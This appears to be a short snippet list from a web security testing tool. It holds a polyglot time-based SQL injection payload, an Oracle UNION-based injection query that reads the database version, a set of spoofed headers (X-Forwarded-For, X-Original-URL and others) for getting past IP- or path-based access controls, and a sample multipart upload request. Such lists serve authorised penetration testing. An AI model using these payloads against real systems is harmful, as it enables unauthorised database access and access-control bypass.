values.name: Polyglot Sleep
values.value: SLEEP(10) /*' or SLEEP(10) or '" or SLEEP(10) or "*/

values.name: OracleSQL Version
values.value: SELECT user FROM dual UNION SELECT * FROM v$version

values.name: Bypass
values.value:
X-Custom-IP-Authorization: 127.0.0.1
X-Original-URL: /
X-Rewrite-URL: /
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwared-Host: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1

values.name: Multipart
values.value:
Content-Type: multipart/form-data; boundary=abcde12345

--abcde12345
Content-Disposition: form-data; name="id"

1
--abcde12345
Content-Disposition: form-data; name="file"; filename="image1.png"
Content-Type: image/png

AAAA
--abcde12345--
